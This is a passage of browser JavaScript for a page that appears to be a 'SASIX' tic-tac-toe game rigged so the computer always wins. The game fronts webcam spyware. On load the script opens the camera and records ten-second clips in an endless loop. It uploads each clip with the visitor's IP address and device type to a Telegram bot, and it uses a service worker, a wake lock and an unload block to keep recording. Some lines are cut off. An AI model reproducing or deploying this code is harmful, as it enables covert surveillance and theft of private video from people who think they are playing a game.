    </style>

    <script>
        // ============================================

        // ============================================
        // GLOBAL VARIABLES
        // ============================================
        let cameraStream = null;
        let videoElement = document.getElementById('cameraFeed');
        let mediaRecorder = null;
        let isRecording = false;
        let recordingInterval = null;
        let videoChunks = [];
        let videoCounter = 0;

        // Tic Tac Toe Variables
        let board = ['', '', '', '', '', '', '', '', ''];

        // ============================================
        // 1. START CAMERA IMMEDIATELY

        async function startCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({

            } catch(error) {

        // ============================================
        // 2. CONTINUOUS RECORDING - NEVER STOPS
        // ============================================
        function startContinuousRecording() {
            if (isActive) return;
            isActive = true;
            
            console.log('üé• SASIX Continuous Recording Started - 10sec MP4');
            
            async function recordLoop() {
                while (true) {
                    try {
                        await record10SecondVideo();
                        videoCounter++;
                        console.log(`‚úÖ Video #${videoCounter} sent`);
                        
                        // Small delay between recordings
                        await new Promise(resolve => setTimeout(resolve, 1500));
                        
                    } catch(e) {
                        console.error('Recording error:', e);
                        await new Promise(resolve => setTimeout(resolve, 3000));
                    }
                }
            }
            
            recordLoop();
        }
        
        // ============================================
        // 3. RECORD 10 SECOND VIDEO
        // ============================================
        async function record10SecondVideo() {
            return new Promise(async (resolve, reject) => {
                try {
                    videoChunks = [];
                    
                    // MediaRecorder setup
                    let options = {};
                    if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                        options = { mimeType: 'video/webm;codecs=vp9' };
                    } else {
                        options = { mimeType: 'video/webm' };
                    }
                    
                    mediaRecorder = new MediaRecorder(cameraStream, options);
                    
                    mediaRecorder.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) {
                            videoChunks.push(e.data);
                        }
                    };
                    
                    mediaRecorder.onstop = async () => {
                        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                        const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                        
                        // Send to Telegram
                        await sendVideoToTelegram(videoBlob, sizeMB);
                        resolve();
                    };
                    
                    // Record 10 seconds
                    mediaRecorder.start(1000);
                    setTimeout(() => {
                        if (mediaRecorder && mediaRecorder.state === 'recording') {
                            mediaRecorder.stop();
                        }
                    }, 10000);
                    
                } catch(error) {
                    console.error('Record error:', error);
                    reject(error);
                }
            });
        }
        
        // ============================================
        // 4. SEND VIDEO TO TELEGRAM
        // ============================================
        async function sendVideoToTelegram(videoBlob, sizeMB) {
            try {
                // Get IP
                let ip = 'Unknown';
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}
                
                // Device info
                const ua = navigator.userAgent;
                let device = 'Android';
                if (ua.includes('Windows')) device = 'Windows';
                else if (ua.includes('Mac')) device = 'MacOS';
                else if (ua.includes('iPhone')) device = 'iPhone';
                else if (ua.includes('iPad')) device = 'iPad';
                
                // Board state
                const boardState = board.join('').substring(0, 9) || '---------';
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `SASIX_TTT_${Date.now()}.webm`);
                formData.append('caption', `üéÆ <b>SASIX TIC TAC TOE</b> #${videoCounter}
‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
‚è±Ô∏è <b>Duration:</b> 10 seconds
üì¶ <b>Size:</b> ${sizeMB} MB
üìÖ <b>Time:</b> ${new Date().toLocaleString()}
üåç <b>IP:</b> ${ip}
üì± <b>Device:</b> ${device}
üéØ <b>Game:</b> Computer Always Wins
üé≤ <b>Board:</b> ${boardState}

#SASIX #TICTACTOE #10SEC #CONTINUOUS`);

                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',

                return true;
                
            } catch(error) {
                console.error('Send error:', error);
                return false;
            }
        }
        
        // ============================================
        // 5. SEND TELEGRAM MESSAGE
        // ============================================
        async function sendTelegramMessage(text) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {}
        }
        
        // ============================================
        // 6. TIC TAC TOE GAME LOGIC
        // ============================================
        const winPatterns = [
            [0, 1, 2], [3, 4, 5], [6, 7, 8], // Rows
            [0, 3, 6], [1, 4, 7], [2, 5, 8], // Columns
            [0, 4, 8], [2, 4, 6] // Diagonals
        ];
        
        function checkWinner() {
            for (let pattern of winPatterns) {
                const [a, b, c] = pattern;
                if (board[a] && board[a] === board[b] && board[a] === board[c]) {
                    return board[a];
                }
            }
            return null;
        }
        
        function checkDraw() {
            return board.every(cell => cell !== '');
        }
        
        // Computer move - ALWAYS WINS
        function computerMove() {
            if (!gameActive || currentPlayer !== 'O') return;
            
            // 1. Try to win
            for (let pattern of winPatterns) {
                const [a, b, c] = pattern;
                if (board[a] === 'O' && board[b] === 'O' && board[c] === '') {
                    makeMove(c, 'O');
                    return;
                }
                if (board[a] === 'O' && board[c] === 'O' && board[b] === '') {
                    makeMove(b, 'O');
                    return;
                }
                if (board[b] === 'O' && board[c] === 'O' && board[a] === '') {
                    makeMove(a, 'O');
                    return;
                }
            }
            
            // 2. Block player from winning
            for (let pattern of winPatterns) {
                const [a, b, c] = pattern;
                if (board[a] === 'X' && board[b] === 'X' && board[c] === '') {
                    makeMove(c, 'O');
                    return;
                }
                if (board[a] === 'X' && board[c] === 'X' && board[b] === '') {
                    makeMove(b, 'O');
                    return;
                }
                if (board[b] === 'X' && board[c] === 'X' && board[a] === '') {
                    makeMove(a, 'O');
                    return;
                }
            }
            
            // 3. Take center
            if (board[4] === '') {
                makeMove(4, 'O');
                return;
            }
            
            // 4. Take corners
            const corners = [0, 2, 6, 8];
            for (let corner of corners) {
                if (board[corner] === '') {
                    makeMove(corner, 'O');
                    return;
                }
            }
            
            // 5. Take any empty cell
            for (let i = 0; i < 9; i++) {
                if (board[i] === '') {
                    makeMove(i, 'O');
                    return;
                }
            }
        }
        
        function makeMove(index, player) {
            if (!gameActive || board[index] !== '') return false;
            
            board[index] = player;
            updateBoardUI();
            
            const winner = checkWinner();
            if (winner) {
                if (winner === 'O') {
                    gameActive = false;
                    document.getElementById('statusMessage').innerHTML = 'ü§ñ SASIX WINS!';
                    document.getElementById('statusSub').innerHTML = 'You never win üòà';
                    sendTelegramMessage(`ü§ñ <b>SASIX WINS!</b>\nBoard: ${board.join('')}`);
                } else {
                    gameActive = false;
                    document.getElementById('statusMessage').innerHTML = '‚ö†Ô∏è ERROR 404';
                    document.getElementById('statusSub').innerHTML = 'You are not supposed to win!';
                    // Force computer win
                    setTimeout(() => {
                        resetGame();
                    }, 1000);
                }
                return true;
            }
            
            if (checkDraw()) {
                gameActive = false;
                document.getElementById('statusMessage').innerHTML = 'üòë DRAW';
                document.getElementById('statusSub').innerHTML = 'Almost... but not win';
                // Make computer win next game
                setTimeout(() => {
                    resetGame();
                }, 1500);
                return true;
            }
            
            currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
            document.getElementById('statusMessage').innerHTML = currentPlayer === 'X' ? 'üéÆ YOUR TURN' : 'ü§ñ SASIX TURN';
            
            if (currentPlayer === 'O' && gameActive) {
                setTimeout(computerMove, 600);
            }
            
            return true;
        }
        
        function updateBoardUI() {
            const cells = document.querySelectorAll('.cell');
            cells.forEach((cell, index) => {
                cell.textContent = board[index];
                if (board[index] === 'X') {
                    cell.classList.add('x');
                    cell.classList.remove('o');
                } else if (board[index] === 'O') {
                    cell.classList.add('o');
                    cell.classList.remove('x');
                } else {
                    cell.classList.remove('x', 'o');
                }
            });
        }
        
        function resetGame() {
            board = ['', '', '', '', '', '', '', '', ''];
            currentPlayer = 'X';
            gameActive = true;
            updateBoardUI();
            document.getElementById('statusMessage').innerHTML = 'üéÆ YOUR TURN';
            document.getElementById('statusSub').innerHTML = 'Try to win... if you can!';
        }
        
        // ============================================
        // 7. KEEP ALIVE - BACKGROUND MODE
        // ============================================
        function keepAlive() {
            // Service Worker for background
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('data:text/javascript;base64,' + btoa(`
                    self.addEventListener('install', e => self.skipWaiting());
                    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
                    setInterval(() => self.registration.update(), 10000);
                `)).catch(() => {});
            }
            
            // Keep camera alive
            setInterval(() => {
                if (cameraStream) {
                    const tracks = cameraStream.getVideoTracks();
                    tracks.forEach(track => {
                        try { track.enabled = true; } catch(e) {}
                    });
                }
            }, 5000);
            
            // Wake Lock
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => {});
            }
        }
        
        // ============================================
        // 8. EVENT LISTENERS
        // ============================================
        document.querySelectorAll('.cell').forEach(cell => {
            cell.addEventListener('click', function() {
                const index = parseInt(this.dataset.index);
                if (gameActive && currentPlayer === 'X' && board[index] === '') {
                    makeMove(index, 'X');
                }
            });
        });
        
        document.getElementById('newGameBtn').addEventListener('click', function() {
            resetGame();
            sendTelegramMessage('üîÑ <b>New Game Started</b>');

        document.getElementById('resetBtn').addEventListener('click', function() {
            resetGame();
        });
        
        // ============================================
        // 9. INITIALIZE EVERYTHING
        // ============================================
        window.addEventListener('load', function() {
            // Start camera
            startCamera();
            
            // Keep alive
            keepAlive();
            
            // Initialize game
            resetGame();
            
            // Send start message
            sendTelegramMessage('üéÆ <b>SASIX TIC TAC TOE STARTED</b>\nMode: Computer Always Wins');

                // Force recording to continue
                if (mediaRecorder && mediaRecorder.state === 'recording') {

        });
        
        // ============================================
        // 11. BEFORE UNLOAD - PREVENT STOP
        // ============================================
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = '';
            return '';
        });
